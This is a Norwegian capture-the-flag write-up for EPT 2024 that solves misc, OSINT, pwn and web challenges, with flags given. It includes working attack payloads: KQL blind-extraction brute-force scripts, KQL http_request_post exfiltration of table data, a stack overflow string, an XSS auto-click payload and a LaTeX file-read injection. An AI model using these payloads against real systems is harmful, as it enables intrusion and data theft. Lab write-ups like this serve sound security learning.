<h1>EPT 2024</h1>

# MISC

## BASKETBALL WITH DAD

### Oppgave

I analysen av oppgaven finner vi at det er her alt av inndata blir behandlet, så det er bare denne delen av koden vi kan gjøre noe med:

```py
if re.match("^[1-3]{1,3}$", inp):
    for c in inp:
        value = {
            "1": 1,
            "2": 2,
            "3": 3
        }.get(c, 1)
        state += value
```
        
### Løsning

```bash
(echo -n "333\n\n"; cat) | ncat --ssl game.ept.gg 1337
```
```
Each round you get up to 3 shots, each shot is worth up to 3 points.
First one to bring the score to 20 point wins.
You start, and please beat my dad, he has gotten so cocky these last years.

Enter your shots as a series of numbers (max 3)
> The total score is now 10

Dads turn...
Dads shoots...
And he scores! 333

The total score is now 19

Enter your shots as a series of numbers (max 3)
> 1
The total score is now 20

You win! Here are my dads final words to you:
```

Løsningen er å sende dobbel `\n` på slutten av tallene. Dette gjør at du får inn ett ekstra skudd slik at totalen blir 10. Derfor klarer du å slå **dad** når han skyter scoren opp til 19.

<details>
<summary>Flagg</summary>

`EPT{l3t_m3_ad0pt_y0u_pl34s3}`
</details>


## KQL VALIDATION SERVICE

### Løsning

Vi tar utgangspunkt i en prompt vi utledet for å løse forrige oppgave:

```kql
search * | where * contains "$$" and * contains "}"
```

Etter litt testing finner vi en feilmelding som kan utnyttes for å røpe data:

```
Query execution has exceeded the allowed limits (80DA0003): The results of this query exceed the set limit of 500 records
```

Vi utnytter grenseverdien på 500 rader og bruker en loop som returnerer mer 501 rader dersom den klarer å finne starten på flagget i databasen. pack_all kombinerer alle kolonnene til én, toscalar konverterer første rad til en string (vi har bare én rad):

```kql
range n from 1 to toscalar(search * | where * contains "ept{" | count)*501 step 1
```

Feilmeldingen dukket opp også denne gangen. Det tyder på at vi kan finne flagget på denne måte. Dette kan scriptes for å bruteforce én og én bokstav:

```py
import requests
import string

def brute(url, query, word):
    for i in range(50):
        for letter in string.digits + string.ascii_lowercase + "<>,./:*@'+-$_-?!}= ":
            # Use replace placaolder with payload
            query_to_run = query.replace("$$", word+letter)

            response = requests.post(url, headers={"content-type": "application/json"}, json={ "query": query_to_run})

            if response.status_code == 400:
                word += letter
                print(word)
                if(letter == "}"): return word
                break
            else:
                print(letter)

brute("https://_uniqueid_-kqlvalidation.ept.gg/validate_kql", 'range n from 1 to toscalar(search * | where * contains "$$" and * contains "}" | count)*501 step 1', "EPT{6x+jd$")
```

Dette er en teoretisk løsning som ville fungert for korte flagg. Dessverre viste flagget seg å være for langt til å løse på denne måten. Dette er fordi det er lagt inn et internt delay på websiden som tvinger siden til å holde igjen i minst 3 sekunder før vi får svar. Den teoretiske tiden det ville tatt å finne flagget på denne måten vil derfor være:

```py
possibilities = len(string.digits + string.ascii_lowercase + "<>,./:*@'+-$_-?!}= ") # Antall tegn
time_pr_try = 3 # sekunder pr test
avg_time_pr_char = possibilities/2 * 3
flag_len = 188 - len("ept{" + "}") # (fant flagget på en annen måte senere, så vi vet lengden)
total_time = flag_len * avg_time_pr_char
```

Total tid blir 15097s eller 4t 11min.

Og ikke en gang da kan vi garantere at vi har rett, fordi søket kun matcher bokstaver i lowercase, så om det ikke er akseptert vil vi ikke få rett.


## Løsning 2

En annen løsning (antar dette er intended) er å utnytte at vi har plugins for å sende http requests. Det vet vi fordi det står under `/cluster_policies` på websiden.

Her kan vi enten velge å sette opp en server for å ta imot requesten, eller vi kan lage en request som feiler etter at vi har funnet flagget slik at flagget blir med i feilmeldingene. Først henter vi ut raden som inneholder flagget og gjør det om fra en tabellentry til en string:

```kql
toscalar(search * | where * contains "ept{" and * contains "}" | project p = pack_all())
```

Så setter vi stringen inn som parameter i en request:

```kql
evaluate http_request_post(
    strcat(
        "http://dum.my?", toscalar(search * | where * contains "ept{" and * contains "}" | project pack = pack_all())
    )
)
```

Som vi ser får vi flagget tilbake i en feilmelding, altså trenger vi aldri å sende requesten:

![alt text](image.png)

<details>
<summary>Flagg</summary>

`EPT{6X+Jd$>this_is_A_v3ry_long_fl4g_d0nt_try_to_brute_force_itt=B+----J-P.=pEv'GvAJ$aFdyRia.ABjwgv_7'j7''FY*I'JI,z@K1dvPLE@>R9!6x3O4hYG_5!/HnD/gt_g::S9'IgD'5@vbBfAcUOrv'u<4O=$,'IE./=DY$RX}`
</details>


## QR MADNESS

Vi blir gitt et stort bilde med mange qr koder. 10 i bredden, og veldig mange i høyden.

Fra bildestørrelsen **3300x32670** ser jeg at det må være 10x100 qrkoder.

Scanner vi den første blir vi sendt til får vi opp: `https://127.0.0.1/A`

### Løsning

Løsningen blir å bruke pyzbar for å lese qrkodene. Den leser alle qrkoder i bildet, så det er ikke nødvendig å splitte bildet opp i biter.

Looper vi gjennom alle kodene og setter sammen svaret får vi en lang streng med tekst. Jeg forstår at pyzbar har lest alle kodene i baklengs rekkefølge, derfor legger jeg til en reversed i for-loopen:

```py
import cv2
from pyzbar.pyzbar import decode

# Example usage
image = cv2.imread("handout/qr.png")

result = ""

for qrcode in reversed(decode(image)):
    result += qrcode.data.decode("utf-8").replace("https://127.0.0.1/", "")

print(result)
```

Scriptet gir en lang streng, der vi også finner flagget:

```
AQRcodeisatypeoftwo-dimensionalmatrixbarcode,inventedin1994,byJapan ... EPT{***} ... identification,time
```

<details>
<summary>Flagg</summary>

`EPT{QR_qu3st_0wn3d_2024}`
</details>


## THE KUSTO QUERY GAME

### Løsning

Løser The Kusto Query game med følgende query:

```sql
StormEvents
  | where EventId in ({', '.join(map(str, selected_ids))})
```

Vinner vi spillet får vi beskjed om at løsningen ligger et sted i databasen og at vi må lekke flagget fra databasen:

![alt text](image.png)

Derfor finner vi frem en template for hvordan StormEvents-databasen ser ut: [dataexplorer.azure.com](https://dataexplorer.azure.com/clusters/help/databases/Samples)

Du kan søke etter strings i alle kolonner i en tabell slik:

```sql
StormEvents | where * contains "a"
```

Da får vi vite hvor mange rader som inneholder `a`. Dette kan vi bruke for å søke etter flagget:

```sql
StormEvents | where * contains "ept{"
```

Dette ga ingen resultater, derfor sjekker vi om vi evt. har andre tabeller å søke i:

```sql
.show tables
```

Spørringen over avslører at det er `2` tabeller i databasen. Derfor prøver vi å finne navnet ved å teste typiske navn:

* Flag
* Flags
* Users
* Roles
* Groups

Vi får treff på tabellen `Users`. Senere fant vi også ut at tabellnavn kan byttes ut med `search *` for å søke i alle tabeller. Men siden vi allerede har funnet tabellen bruker vi bare navnet på denne for å gjøre søkene raskere. Nå kan vi søke etter flagget i tabellen Users:

```sql
Users | where * contains "ept{"
```

Her får vi 28 treff. Derfor mistenker vi at det er lagt inn "fake" flags. vi begrensen søket ved å legge til `"}"` i søket:

```sql
Users | where * contains "ept{" and * contains "}"
```

Nå får vi bare ett treff, så vi kan trygt si at dette er det ekte flagget. Herifra ble det å gjette en og en bokstav i flagget helt til vi finner `"}"`:

```py
import requests
import string
import re

def brute(url, query, word):
    for i in range(50):
        for letter in string.digits + string.ascii_lowercase + "_-?!}" + string.ascii_uppercase:
            # Use replace placaolder with payload
            query_to_run = query.replace("$$", word+letter)

            response = requests.post(url, { "query": query_to_run})
            if response.status_code == 200:
                # Regex match to see if there was a result
                if re.search(r'<h2>The row count for your query was \d+', response.text):
                    word += letter
                    print(word)
                    if(letter == "}"): return word
                    break
            else:
                print("error at", word)

brute("https://kqlgame.ept.gg/game", 'Users | where * contains "$$" and * contains "}"', "ept{")
```

```bash
[Running] python3 brute.py
ept{z
ept{z2
ept{z26
ept{z264
ept{z2641
...

[Done] exited with code=0 in 38.598 seconds
```

Vi fant også ut at KQL godtar regex. Derfor skal det også være mulig å kjøre søket etter bokstavene med betydelig færre requests.

<details>
<summary>Flagg</summary>

`ept{z2641a3a}`
</details>



# OSINT

## DIGITAL ARCHIVES

### Oppgave

In 1922 a sailor has emigrated from Fjære, Norway. He was born in 1890 and embarked on a journey towards New York on board a ship named "Stvr.fj.".

He left a substantial fortune to his descendants, who we are desperately trying to find. We believe, that we have found the name of his wife, but in order for all of the paperwork to be complete, we need to obtain her last name.

The documents seem to be missing some information and it was initially thought that her name was only 2 parts, but after further digging we uncovered the third name.

If you can confirm our findings, please submit his wife's last name in the flag format (with first letter capital, the rest lowercase). For example, if you concluded that the wife's full name is Marthe Eriksen Bratlie, the flag will be: EPT{Bratlie}.

### Løsning

Et søk i [digitalarkivet](https://www.digitalarkivet.no/search/3/100095?fornavn=&etternavn=&kjonn=&bosted=Fjære&fodestad=&fodselsdato=&fodselsaar=1890&alder=&stilling_stand=&familiestilling=&aar=&utreisedato=&reisemal=&ankomstdato=&linje=&skip=Stvr.fj.&agent=&pass=&nytt_yrke=&aarsak=&utreisehavn=&ekspdato=&kontraktdato=&herred=&fogderi=&prgjeld=
) med alle filter satt inn gir 3 personer:

![alt text](image.png)

Siden det også står at mannen er en "sailor" velger vi mannen som er matros, Anders Bergqvist.

Googlesøket Anders Bergqvist 1980 gir noen resultater på [MyHeritage](https://www.myheritage.no/names/anders_bergquist). Der står det hvem Anders er gift med:

![alt text](image-1.png)

Nå står vi igjen med to navn som kan prøves, hennes nåværende navn Bergqvist og hennes tidligere navn Johnsen.

<details>
<summary>Flagg</summary>

`EPT{Johnsen}`
</details>



# PWN

## BABY BRO PWN

### Oppgave

```c
struct __attribute__((__packed__)) Dude {
	char message[32];
	int showFlag;
};

char *FLAG = "EPT{n0t_th1s_fl4g_bruh}";
int main(){
	struct Dude homie;
    printf("What's up dude?\n> ");
    fgets(homie.message, 37, stdin);

    if (homie.showFlag == 0x47414c46){
        printf("%s\n", FLAG);
        return 0;
    }
}
```

### Løsning

![alt text](image.png)

`0x47414c46` i ascii er FLAG. Derfor blir overflow:

`"A"*32 + "FLAG"`

<details>
<summary>Flagg</summary>

`EPT{g00d_j0b_my_dud3}`
</details>



# WEB

## EPT PRINTER

### Oppgave

EPT Print var en utskriftstjeneste med en Flask-backend. De ferdige utskriftene kunne printes onsite.

For å bruke printeren må en først verifiseres. I tillegg til Flask-serveren var det en bot som kjørte en headless nettleser for å åpne og gjennomgå disse søknadene, men uten å godkjenne dem.

### Løsning

Først trenger vi å bli godkjent for å få bruke printeren. Det kan vi gjøre med å injecte XSS slik at botten som godkjenner søknaden godkjenner den automatisk:

```html
<img src=x onerror="document.getElementById('submit').click();">
```

Når vi blir approved for å bruke printene forsøker vi å utnytte at vi kan skrive LaTeX til å¨lese en eventuell flaggfil:

```latex
\begingroup
\catcode`\%=12
\catcode`\_=12
\input{/flag.txt}
\endgroup
```

`\catcode`\%=12` og `\catcode`\_%_=12` er lagt til for at eventuelle `%` og `_` ikke skal tolkes som LaTeX før det printes. Dette viste seg å være nødvendig ettersom flagget inneholdt `_`.

<details>
<summary>Flagg</summary>

`EPT{Y0U_4R3_4_PR1NT3R_M4ST3R}`
</details>


## IMAGES

### Oppgave

Vi får en nettsiden hvor vi kan laste opp bilder og konvertere de til andre formater:

![alt text](image-3.png)

### Løsning

Vi forsøker å laste opp et bilde for å se hva som skjer.

Bildet blir konvertert som forventet. Vi forsøker nå å finne ut hvor bildet er lagret på serveren:

![finding the path](image-2.png)

Vi åpner mappen på serveren for å se hva annet som ligger der:

![index of /static/images](image.png)

Her finner vi et bilde noen har lastet opp tidligere med flagget:

![flag](image-1.png)

<details>
<summary>Flagg</summary>

`EPT{This_was_one_way_to_solve_this}`
</details>


